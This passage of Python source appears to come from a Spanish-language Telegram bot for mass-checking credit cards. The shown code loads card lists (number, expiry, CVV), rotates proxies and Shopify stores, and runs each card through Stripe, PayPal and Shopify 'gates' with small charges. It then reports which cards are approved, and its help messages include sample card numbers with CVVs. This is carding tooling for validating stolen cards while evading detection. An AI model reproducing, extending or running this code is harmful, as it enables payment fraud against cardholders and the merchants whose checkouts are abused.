    tiempo_total = time.time() - start_time
    minutos = int(tiempo_total // 60)
    segundos = int(tiempo_total % 60)
    
    filename = f"resultados_paypal_{task_id}.txt"
    with open(filename, 'w', encoding='utf-8') as f:
        f.write(f"RESULTADOS VERIFICACIÓN PAYPAL\n")
        f.write(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
        f.write(f"Fecha: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"Total tarjetas: {total}\n")
        f.write(f"Tiempo: {minutos}m {segundos}s\n")
        f.write(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n")
        f.write(f"💵 PayPal $10: ✅{resultados['paypal10']['success']} ❌{resultados['paypal10']['failed']} ⚠️{resultados['paypal10']['error']}\n")
        f.write(f"🪙 PayPal $0.10: ✅{resultados['paypal01']['success']} ❌{resultados['paypal01']['failed']} ⚠️{resultados['paypal01']['error']}\n")
        f.write(f"💎 PayPal $1: ✅{resultados['paypal1']['success']} ❌{resultados['paypal1']['failed']} ⚠️{resultados['paypal1']['error']}\n")
        f.write(f"✅ Tarjetas únicas aprobadas: {resultados['total_aprobadas']}\n\n")
        f.write(f"━━━━ DETALLES COMPLETOS ━━━━━━━━━━━━━━\n\n")
        for d in detalles:
            f.write(f"{d}\n\n")
    
    # Mensaje final
    texto_final = f"""✅ VERIFICACIÓN PAYPAL COMPLETADA
━━━━━━━━━━━━━━━━━━━━━━
📊 RESULTADOS:
💵 $10: ✅{resultados['paypal10']['success']} ❌{resultados['paypal10']['failed']}
🪙 $0.10: ✅{resultados['paypal01']['success']} ❌{resultados['paypal01']['failed']}
💎 $1: ✅{resultados['paypal1']['success']} ❌{resultados['paypal1']['failed']}
✅ Aprobadas únicas: {resultados['total_aprobadas']}
⏱️ Tiempo: {minutos}m {segundos}s

📁 Se generó archivo con detalles completos"""
    
    try:
        bot.edit_message_text(texto_final, chat_id, msg.message_id)
    except:
        bot.send_message(chat_id, texto_final)
    
    # Enviar archivo
    with open(filename, 'rb') as f:
        bot.send_document(chat_id, f, caption=f"📊 Resultados PayPal - {total} tarjetas")
    
    os.remove(filename)
    
    time.sleep(300)
    if task_id in active_tasks:
        del active_tasks[task_id]

# ==================== VERIFICACIÓN MASIVA AUTOSHOPIFY ====================

@bot.message_handler(commands=['msh'])
def cmd_mass_shopify(message):
    """Verificación masiva con AutoShopify"""
    
    tarjetas = obtener_todas_tarjetas()
    sitios = obtener_sitios()
    
    if not tarjetas:
        bot.reply_to(message, "📭 No hay tarjetas guardadas")
        return
    
    if not sitios:
        bot.reply_to(message, "📭 No hay sitios guardados. Usa /addsh para agregar.")
        return
    
    # Procesar opciones
    texto = message.text.split()
    delay = 3
    notificar_cada = 10
    
    for i, arg in enumerate(texto):
        if arg == '--delay' and i+1 < len(texto):
            try:
                delay = int(texto[i+1])
            except:
                pass
        elif arg == '--notificar' and i+1 < len(texto):
            try:
                notificar_cada = int(texto[i+1])
            except:
                pass
    
    proxies = obtener_proxies()
    if not proxies:
        bot.reply_to(message, "⚠️ Sin proxies - Usando modo gestionado")
    
    task_id = f"msh_{datetime.now().strftime('%Y%m%d%H%M%S')}_{random.randint(1000,9999)}"
    
    active_tasks[task_id] = {
        'chat_id': message.chat.id,
        'cancel': False
    }
    
    config = f"""🛍️ VERIFICACIÓN MASIVA SHOPIFY
━━━━━━━━━━━━━━━━━━━━━━
📌 Tarjetas: {len(tarjetas)}
🌐 Sitios: {len(sitios)}
⏱️ Delay: {delay}s
🔔 Notificar: cada {notificar_cada}
🆔 ID: {task_id}

/cancelar_{task_id} - Cancelar"""
    
    bot.reply_to(message, config)
    
    thread = Thread(target=procesar_verificacion_masiva_shopify, 
                   args=(task_id, message.chat.id, delay, notificar_cada))
    thread.daemon = True
    thread.start()

def procesar_verificacion_masiva_shopify(task_id, chat_id, delay, notificar_cada):
    """Procesa verificación masiva con AutoShopify"""
    
    cards = [c[0] for c in obtener_todas_tarjetas()]
    sitios = obtener_sitios()
    total_tarjetas = len(cards)
    total_sitios = len(sitios)
    
    if total_tarjetas == 0 or total_sitios == 0:
        bot.send_message(chat_id, "📭 No hay tarjetas o sitios suficientes")
        return
    
    msg = bot.send_message(chat_id, "🔄 Iniciando verificación Shopify...")
    
    procesadas = 0
    resultados = {'success': 0, 'failed': 0, 'error': 0}
    detalles = []
    start_time = time.time()
    sitio_index = 0
    proxy_index = 0
    
    proxies = obtener_proxies()
    
    for i, card in enumerate(cards, 1):
        if task_id in active_tasks and active_tasks[task_id].get('cancel'):
            bot.edit_message_text("🛑 Cancelado", chat_id, msg.message_id)
            break
        
        # Rotación de sitios (round robin)
        sitio = sitios[sitio_index % total_sitios]
        sitio_index += 1
        
        bin_info = consultar_bin(card[:6])
        
        mejor_resultado = None
        if proxies:
            # Rotación de proxies
            proxy = proxies[proxy_index % len(proxies)]
            proxy_index += 1
            resultado = verificar_api_autoshopify(card, sitio, proxy)
            mejor_resultado = resultado
        else:
            resultado = verificar_api_autoshopify(card, sitio)
            mejor_resultado = resultado
        
        if mejor_resultado:
            guardar_historial(card, mejor_resultado['proxy'], f"Shopify ${mejor_resultado['amount']}", 
                            mejor_resultado['amount'], mejor_resultado['status'], 
                            mejor_resultado['message'], mejor_resultado['gates'], bin_info)
            
            # Actualizar estadísticas del sitio
            actualizar_estadisticas_sitio(sitio, mejor_resultado['success'])
            
            if mejor_resultado['status'] == 'success':
                resultados['success'] += 1
                estado_emoji = "✅"
            elif mejor_resultado['status'] == 'failed':
                resultados['failed'] += 1
                estado_emoji = "❌"
            else:
                resultados['error'] += 1
                estado_emoji = "⚠️"
            
            detalles.append(f"{estado_emoji} {card} | Sitio: {sitio[:30]}... | {mejor_resultado['status']} | {mejor_resultado['message'][:30]}")
        
        procesadas = i
        
        # Actualizar cada N tarjetas
        if i % notificar_cada == 0 or i == total_tarjetas:
            porcentaje = (i / total_tarjetas) * 100
            barra = "█" * int(porcentaje/10) + "░" * (10 - int(porcentaje/10))
            
            texto = f"""📊 PROGRESO: {i}/{total_tarjetas}
{barra} {porcentaje:.0f}%

✅ Aprobadas: {resultados['success']}
❌ Declinadas: {resultados['failed']}
⚠️ Errores: {resultados['error']}"""
            
            try:
                bot.edit_message_text(texto, chat_id, msg.message_id)
            except:
                pass
        
        if delay > 0 and i < total_tarjetas:
            time.sleep(delay)
    
    # Generar archivo de resultados
    tiempo_total = time.time() - start_time
    minutos = int(tiempo_total // 60)
    segundos = int(tiempo_total % 60)
    
    filename = f"resultados_shopify_{task_id}.txt"
    with open(filename, 'w', encoding='utf-8') as f:
        f.write(f"RESULTADOS VERIFICACIÓN SHOPIFY\n")
        f.write(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
        f.write(f"Fecha: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"Total tarjetas: {total_tarjetas}\n")
        f.write(f"Sitios usados: {total_sitios}\n")
        f.write(f"Tiempo: {minutos}m {segundos}s\n")
        f.write(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n")
        f.write(f"✅ Aprobadas: {resultados['success']}\n")
        f.write(f"❌ Declinadas: {resultados['failed']}\n")
        f.write(f"⚠️ Errores: {resultados['error']}\n\n")
        f.write(f"━━━━ DETALLES ━━━━━━━━━━━━━━\n\n")
        for d in detalles:
            f.write(f"{d}\n")
    
    # Mensaje final
    texto_final = f"""✅ VERIFICACIÓN SHOPIFY COMPLETADA
━━━━━━━━━━━━━━━━━━━━━━
📊 RESULTADOS:
✅ Aprobadas: {resultados['success']}
❌ Declinadas: {resultados['failed']}
⚠️ Errores: {resultados['error']}
⏱️ Tiempo: {minutos}m {segundos}s

📁 Se generó archivo con detalles"""
    
    try:
        bot.edit_message_text(texto_final, chat_id, msg.message_id)
    except:
        bot.send_message(chat_id, texto_final)
    
    # Enviar archivo
    with open(filename, 'rb') as f:
        bot.send_document(chat_id, f, caption=f"📊 Resultados Shopify - {total_tarjetas} tarjetas")
    
    os.remove(filename)
    
    time.sleep(300)
    if task_id in active_tasks:
        del active_tasks[task_id]

# ==================== CALLBACKS PARA BOTONES ====================

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    if call.data == 'volver_principal':
        bot.edit_message_text(
            "Selecciona una opción:",
            call.message.chat.id,
            call.message.message_id,
            reply_markup=menu_principal()
        )
    
    elif call.data == 'menu_tarjetas':
        bot.edit_message_text(
            "💳 *GESTIÓN DE TARJETAS*\n\nSelecciona una opción:",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='Markdown',
            reply_markup=menu_tarjetas()
        )
    
    elif call.data == 'menu_proxies':
        bot.edit_message_text(
            "🌐 *GESTIÓN DE PROXIES*\n\nSelecciona una opción:",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='Markdown',
            reply_markup=menu_proxies()
        )
    
    elif call.data == 'menu_paypal':
        bot.edit_message_text(
            "💰 *SELECCIONA GATE PAYPAL*\n\nElige el monto:",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='Markdown',
            reply_markup=menu_paypal()
        )
    
    elif call.data == 'menu_stripe':
        bot.send_message(
            call.message.chat.id,
            "💳 *STRIPE $1.00*\n\nUsa: `/check NUMERO|MES|AÑO|CVV`\n\nEjemplo: `/check 4169161481963022|09|2029|859`",
            parse_mode='Markdown'
        )
    
    elif call.data == 'menu_stripe_134':
        bot.send_message(
            call.message.chat.id,
            "💳 *STRIPE $1.34 (GATE 2)*\n\nUsa: `/check134 NUMERO|MES|AÑO|CVV`\n\nEjemplo: `/check134 4169161481963022|09|2029|859`\n\nMasivo: `/mass134`",
            parse_mode='Markdown'
        )
    
    elif call.data == 'menu_shopify':
        bot.edit_message_text(
            "🛍️ *GESTIÓN DE SITIOS SHOPIFY*\n\nSelecciona una opción:",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='Markdown',
            reply_markup=menu_shopify()
        )
    
    elif call.data == 'paypal_10':
        bot.send_message(
            call.message.chat.id,
            "💰 *PAYPAL $10.00*\n\nUsa: `/pp NUMERO|MES|AÑO|CVV`\n\nEjemplo: `/pp 377481019318036|06|2029|1937`",
            parse_mode='Markdown'
        )
    
    elif call.data == 'paypal_01':
        bot.send_message(
            call.message.chat.id,
            "🪙 *PAYPAL $0.10*\n\nUsa: `/pp2 NUMERO|MES|AÑO|CVV`\n\nEjemplo: `/pp2 377481019318036|06|2029|1937`",
            parse_mode='Markdown'
        )
    
    elif call.data == 'paypal_1':
        bot.send_message(
            call.message.chat.id,
            "💎 *PAYPAL $1.00*\n\nUsa: `/pp3 NUMERO|MES|AÑO|CVV`\n\nEjemplo: `/pp3 377481019318036|06|2029|1937`",
            parse_mode='Markdown'
        )
    
    elif call.data == 'shopify_individual':
        bot.send_message(
            call.message.chat.id,
            "🛍️ *AUTOSHOPIFY INDIVIDUAL*\n\nUsa: `/sh NUMERO|MES|AÑO|CVV`\n\nEjemplo: `/sh 4128717483067607|07|27|443`\n\nPara sitio específico: `/sh CC URL`",
            parse_mode='Markdown'
        )
    
    elif call.data == 'shopify_masivo':
        bot.send_message(
            call.message.chat.id,
            "🛍️ *VERIFICACIÓN MASIVA SHOPIFY*\n\nUsa: `/msh`\n\nOpciones:\n`/msh --delay 3 --notificar 10`",
            parse_mode='Markdown'
        )
    
    elif call.data == 'add_sitio':
        msg = bot.send_message(
            call.message.chat.id,
            "➕ *AÑADIR SITIO SHOPIFY*\n\nEnvía la URL del sitio:\n`https://tienda.myshopify.com`",
            parse_mode='Markdown'
        )
        bot.register_next_step_handler(msg, procesar_add_sitio)
    
    elif call.data == 'listar_sitios':
        cmd_listar_sitios(call.message)
    
    elif call.data == 'del_sitio':
        msg = bot.send_message(
            call.message.chat.id,
            "🗑️ *ELIMINAR SITIO*\n\nEnvía la URL del sitio a eliminar:",
            parse_mode='Markdown'
        )
        bot.register_next_step_handler(msg, procesar_del_sitio)
    
    elif call.data == 'del_all_sitios':
        confirmacion = types.InlineKeyboardMarkup()
        btn1 = types.InlineKeyboardButton("✅ Sí, eliminar todos", callback_data='confirm_del_all_sitios')
        btn2 = types.InlineKeyboardButton("❌ No, cancelar", callback_data='cancel_del_all_sitios')
        confirmacion.add(btn1, btn2)
        bot.edit_message_text(
            "⚠️ *¿ESTÁS SEGURO?*\n\nEsto eliminará TODOS los sitios guardados permanentemente.",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='Markdown',
            reply_markup=confirmacion
        )
    
    elif call.data == 'menu_stats':
        stats = obtener_estadisticas()
        texto = (
            "╔════════════════════════════╗\n"
            "║     📊 ESTADÍSTICAS        ║\n"
            "╠════════════════════════════╣\n"
            f"║ 🌐 PROXIES                 ║\n"
            f"║    📌 {stats['proxies']} guardados        ║\n"
            f"║    ✅ {stats['exits_proxy']} éxitos       ║\n"
            f"║    ❌ {stats['fallos_proxy']} fallos       ║\n"
            f"╠════════════════════════════╣\n"
            f"║ 🛍️ SITIOS                 ║\n"
            f"║    📌 {stats['sitios']} guardados         ║\n"
            f"║    ✅ {stats['exits_sitio']} éxitos        ║\n"
            f"║    ❌ {stats['fallos_sitio']} fallos        ║\n"
            f"╠════════════════════════════╣\n"
            f"║ 💳 TARJETAS                ║\n"
            f"║    📋 {stats['tarjetas']} total          ║\n"
            f"╠════════════════════════════╣\n"
            f"║ 📝 VERIFICACIONES          ║\n"
            f"║    📈 {stats['checks']} totales       ║\n"
            f"║    ✅ {stats['aprobadas']} aprobadas     ║\n"
            "╚════════════════════════════╝"
        )
        bot.send_message(call.message.chat.id, texto, reply_markup=menu_principal())
    
    elif call.data == 'menu_cargar':
        bot.send_message(
            call.message.chat.id,
            "📁 *CARGAR ARCHIVO*\n\nEnvía un archivo .txt con:\n\n💳 Tarjetas: NUMERO|MES|AÑO|CVV\n🌐 Proxies: ip:puerto:user:pass\n🛍️ Sitios: https://tienda.myshopify.com\n\nEl bot detectará automáticamente qué es cada cosa.",
            parse_mode='Markdown'
        )
    
    elif call.data == 'listar_tarjetas':
        listar_tarjetas(call.message)
    
    elif call.data == 'listar_proxies':
        listar_proxies(call.message)
    
    elif call.data == 'add_proxy':
        msg = bot.send_message(
            call.message.chat.id,
            "➕ *AÑADIR PROXY*\n\nEnvía el proxy en formato:\n`ip:puerto:user:pass`\n\nEjemplo: `193.36.187.170:3128:user:pass`",
            parse_mode='Markdown'
        )
        bot.register_next_step_handler(msg, procesar_add_proxy)
    
    elif call.data == 'del_proxy':
        msg = bot.send_message(
            call.message.chat.id,
            "🗑️ *ELIMINAR PROXY*\n\nEnvía el proxy a eliminar:",
            parse_mode='Markdown'
        )
        bot.register_next_step_handler(msg, procesar_del_proxy)
    
    elif call.data == 'del_all_proxies':
        confirmacion = types.InlineKeyboardMarkup()
        btn1 = types.InlineKeyboardButton("✅ Sí, eliminar todos", callback_data='confirm_del_all_proxies')
        btn2 = types.InlineKeyboardButton("❌ No, cancelar", callback_data='cancel_del_all_proxies')
        confirmacion.add(btn1, btn2)
        bot.edit_message_text(
            "⚠️ *¿ESTÁS SEGURO?*\n\nEsto eliminará TODOS los proxies guardados permanentemente.",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='Markdown',
            reply_markup=confirmacion
        )
    
    elif call.data == 'confirm_del_all_proxies':
        cantidad = eliminar_todos_proxies()
        bot.edit_message_text(
            f"🗑️ *Se eliminaron {cantidad} proxies*",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='Markdown',
            reply_markup=menu_proxies()
        )
    
    elif call.data == 'cancel_del_all_proxies':
        bot.edit_message_text(
            "✅ Operación cancelada",
            call.message.chat.id,
            call.message.message_id,
            reply_markup=menu_proxies()
        )
    
    elif call.data == 'confirm_del_all_sitios':
        cantidad = eliminar_todos_sitios()
        bot.edit_message_text(
            f"🗑️ *Se eliminaron {cantidad} sitios*",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='Markdown',
            reply_markup=menu_shopify()
        )
    
    elif call.data == 'cancel_del_all_sitios':
        bot.edit_message_text(
            "✅ Operación cancelada",
            call.message.chat.id,
            call.message.message_id,
            reply_markup=menu_shopify()
        )
    
    elif call.data == 'test_proxies':
        cmd_test_proxies(call.message)
    
    elif call.data == 'clean_dead':
        eliminados = eliminar_proxies_muertos()
        bot.send_message(
            call.message.chat.id,
            f"🧹 Se eliminaron {eliminados} proxies muertos",
            reply_markup=menu_proxies()
        )
    
    elif call.data == 'eliminar_tarjeta':
        msg = bot.send_message(
            call.message.chat.id,
            "🗑️ *ELIMINAR TARJETA*\n\nEnvía la tarjeta a eliminar en formato:\n`NUMERO|MES|AÑO|CVV`",
            parse_mode='Markdown'
        )
        bot.register_next_step_handler(msg, procesar_del_tarjeta)
    
    elif call.data == 'limpiar_tarjetas':
        confirmacion = types.InlineKeyboardMarkup()
        btn1 = types.InlineKeyboardButton("✅ Sí, eliminar todas", callback_data='confirm_limpiar_tarjetas')
        btn2 = types.InlineKeyboardButton("❌ No, cancelar", callback_data='cancel_limpiar_tarjetas')
        confirmacion.add(btn1, btn2)
        bot.edit_message_text(
            "⚠️ *¿ESTÁS SEGURO?*\n\nEsto eliminará TODAS las tarjetas guardadas permanentemente.",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='Markdown',
            reply_markup=confirmacion
        )
    
    elif call.data == 'confirm_limpiar_tarjetas':
        cantidad = eliminar_todas_tarjetas()
        bot.edit_message_text(
            f"🗑️ *Se eliminaron {cantidad} tarjetas*",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='Markdown',
            reply_markup=menu_tarjetas()
        )
    
    elif call.data == 'cancel_limpiar_tarjetas':
        bot.edit_message_text(
            "✅ Operación cancelada",
            call.message.chat.id,
            call.message.message_id,
            reply_markup=menu_tarjetas()
        )

def procesar_add_proxy(message):
    proxy = message.text.strip()
    if guardar_proxy(proxy):
        texto = (
            "╔════════════════════════════╗\n"
            "║     ✅ PROXY GUARDADO      ║\n"
            "╠════════════════════════════╣\n"
            f"║  {proxy[:30]}{'...' if len(proxy)>30 else ''}  ║\n"
            "╚════════════════════════════╝"
        )
    else:
        texto = "❌ Error: El proxy ya existe"
    
    bot.reply_to(message, texto, reply_markup=menu_principal())

def procesar_del_proxy(message):
    proxy = message.text.strip()
    if eliminar_proxy(proxy):
        texto = f"✅ Proxy eliminado: {proxy[:30]}"
    else:
        texto = "❌ Proxy no encontrado"
    
    bot.reply_to(message, texto, reply_markup=menu_principal())

def procesar_add_sitio(message):
    url = message.text.strip()
    if guardar_sitio(url):
        texto = (
            "╔════════════════════════════╗\n"
            "║     ✅ SITIO GUARDADO      ║\n"
            "╠════════════════════════════╣\n"
            f"║  {url[:30]}{'...' if len(url)>30 else ''}  ║\n"
            "╚════════════════════════════╝"
        )
    else:
        texto = "❌ Error: El sitio ya existe o URL inválida"
    
    bot.reply_to(message, texto, reply_markup=menu_principal())

def procesar_del_sitio(message):
    url = message.text.strip()
    if eliminar_sitio(url):
        texto = f"✅ Sitio eliminado: {url[:30]}"
    else:
        texto = "❌ Sitio no encontrado"
    
    bot.reply_to(message, texto, reply_markup=menu_principal())

def procesar_del_tarjeta(message):
    tarjeta = message.text.strip()
    if eliminar_tarjeta(tarjeta):
        texto = f"✅ Tarjeta eliminada: {tarjeta[:20]}..."
    else:
        texto = "❌ Tarjeta no encontrada"
    
    bot.reply_to(message, texto, reply_markup=menu_tarjetas())

# ==================== COMANDOS DE LISTADO ====================

def listar_tarjetas(message):
    tarjetas = obtener_todas_tarjetas()
    
    if not tarjetas:
        bot.send_message(message.chat.id, "📭 No hay tarjetas guardadas", reply_markup=menu_principal())
        return
    
    texto = "╔════════════════════════════╗\n║     💳 MIS TARJETAS      ║\n╠════════════════════════════╣\n"
    
    for cc, fecha, veces in tarjetas[:10]:
        fecha_corta = fecha[5:16] if fecha else "?"
        cc_short = cc[:10] + "..." + cc[-4:] if len(cc) > 15 else cc
        texto += f"║ 💳 {cc_short:<20} ║\n║    └ {fecha_corta} [{veces} veces] ║\n"
    
    texto += f"╠════════════════════════════╣\n║ 📊 Total: {len(tarjetas)} tarjetas        ║\n╚════════════════════════════╝"
    
    bot.send_message(message.chat.id, texto, reply_markup=menu_tarjetas())

def listar_proxies(message):
    proxies = obtener_proxies_con_estadisticas()
    
    if not proxies:
        bot.send_message(message.chat.id, "📭 No hay proxies guardados", reply_markup=menu_principal())
        return
    
    texto = "╔════════════════════════════╗\n║     🌐 MIS PROXIES       ║\n╠════════════════════════════╣\n"
    
    for proxy, succ, fail, last_test, status in proxies[:10]:
        proxy_short = proxy[:20] + "..." if len(proxy) > 20 else proxy
        
        # Determinar emoji según status
        if status == 'alive':
            status_emoji = "✅"
        elif status == 'slow':
            status_emoji = "🐢"
        elif status == 'dead':
            status_emoji = "❌"
        else:
            status_emoji = "⏳"
        
        texto += f"║ {status_emoji} {proxy_short:<22} ║\n║    ├─ ✅ {succ}  ❌ {fail}        ║\n║    └─ 📊 Último test: {last_test[-8:] if last_test else 'N/A'} ║\n"
    
    texto += "╚════════════════════════════╝"
    bot.send_message(message.chat.id, texto, reply_markup=menu_proxies())

# ==================== ARCHIVOS ====================

@bot.message_handler(content_types=['document'])
def handle_document(message):
    if not message.document.file_name.endswith('.txt'):
        bot.reply_to(message, "❌ Solo acepto archivos .txt")
        return
    
    msg = bot.reply_to(message, "📦 Procesando archivo...")
    
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        contenido = downloaded_file.decode('utf-8')
        
        # Detectar tipo de contenido
        lineas = contenido.strip().split('\n')
        es_tarjeta = False
        es_proxy = False
        es_sitio = False
        
        for linea in lineas[:5]:  # Revisar primeras 5 líneas
            linea = linea.strip()
            if '|' in linea and len(linea.split('|')) == 4:
                es_tarjeta = True
            elif re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+', linea):
                es_proxy = True
            elif re.match(r'^https?://[a-zA-Z0-9-]+\.myshopify\.com/?$', linea):
                es_sitio = True
        
        if es_tarjeta and not es_proxy and not es_sitio:
            # Es archivo de tarjetas
            guardadas, repetidas, invalidas = guardar_tarjetas_desde_texto(contenido)
            texto = (
                "╔════════════════════════════╗\n"
                "║    ✅ TARJETAS CARGADAS    ║\n"
                "╠════════════════════════════╣\n"
                f"║ 📦 Guardadas: {guardadas:<4}             ║\n"
                f"║ 🔁 Repetidas: {repetidas:<4}             ║\n"
                f"║ ❌ Inválidas: {invalidas:<4}             ║\n"
                "╚════════════════════════════╝"
            )
        
        elif es_proxy:
            # Es archivo de proxies
            guardados, repetidos, invalidos = guardar_proxies_desde_texto(contenido)
            texto = (
                "╔════════════════════════════╗\n"
                "║    ✅ PROXIES CARGADOS     ║\n"
                "╠════════════════════════════╣\n"
                f"║ 📦 Guardados: {guardados:<4}             ║\n"
                f"║ 🔁 Repetidos: {repetidos:<4}             ║\n"
                f"║ ❌ Inválidos: {invalidos:<4}             ║\n"
                "╚════════════════════════════╝"
            )
        
        elif es_sitio:
            # Es archivo de sitios Shopify
            guardados, repetidos, invalidos = guardar_sitios_desde_texto(contenido)
            texto = (
                "╔════════════════════════════╗\n"
                "║    ✅ SITIOS CARGADOS      ║\n"
                "╠════════════════════════════╣\n"
                f"║ 📦 Guardados: {guardados:<4}             ║\n"
                f"║ 🔁 Repetidos: {repetidos:<4}             ║\n"
                f"║ ❌ Inválidos: {invalidos:<4}             ║\n"
                "╚════════════════════════════╝"
            )
        
        else:
            texto = "❌ No se pudo identificar el tipo de archivo. Debe ser:\n💳 Tarjetas: NUMERO|MES|AÑO|CVV\n🌐 Proxies: ip:puerto:user:pass\n🛍️ Sitios: https://tienda.myshopify.com"
        
        bot.edit_message_text(texto, message.chat.id, msg.message_id, reply_markup=menu_principal())
        
    except Exception as e:
        bot.edit_message_text(f"❌ Error: {str(e)}", message.chat.id, msg.message_id)

@bot.message_handler(func=lambda m: m.text and m.text.startswith('/cancelar_'))
def cancelar_tarea(message):
    task_id = message.text.replace('/cancelar_', '')
    
    if task_id in active_tasks:
        active_tasks[task_id]['cancel'] = True
        bot.reply_to(message, f"🛑 Cancelando tarea {task_id}...")
    else:
        bot.reply_to(message, f"❌ Tarea no encontrada")

@bot.message_handler(func=lambda m: True)
def default(message):
    if message.text and message.text.startswith('/'):
        bot.reply_to(message, "❓ Comando no reconocido. Usa /menu")
    else:
        bot.reply_to(message, "❓ Usa /menu para ver las opciones")

if __name__ == "__main__":
    print("="*80)
    print("🤖 AUTO SHOPIFY BOT - VERSIÓN COMPLETA CON 4 GATES")
    print("="*80)
    print("✅ Gates disponibles:")
    print("   • Stripe: $1.00       → /check")
    print("   • Stripe: $1.34       → /check134 (NUEVO)")
    print("   • PayPal: $10         → /pp")
    print("   • PayPal: $0.10       → /pp2")
    print("   • PayPal: $1          → /pp3")
    print("   • AutoShopify: variable → /sh")
    print("="*80)
    print("✅ Comandos masivos:")
    print("   • Stripe $1 masivo   → /mass")
    print("   • Stripe $1.34 masivo → /mass134")
    print("   • PayPal masivo      → /mpp")
    print("   • Shopify masivo     → /msh")
    print("="*80)
    print("✅ Proxies y Sitios:")
    print("   • /addproxy, /proxies, /px, /delallproxy")
    print("   • /addsh, /sitios, /delsh, /delallsitios")
    print("="*80)
    print("📱 Usa /menu para comenzar")
    print("="*80)
    
    # Para Railway, usamos polling con timeout
    try:
        bot.infinity_polling(timeout=60, long_polling_timeout=60)
    except Exception as e:
        print(f"❌ Error en polling: {e}")
        time.sleep(10)
        bot.infinity_polling(timeout=60, long_polling_timeout=60)
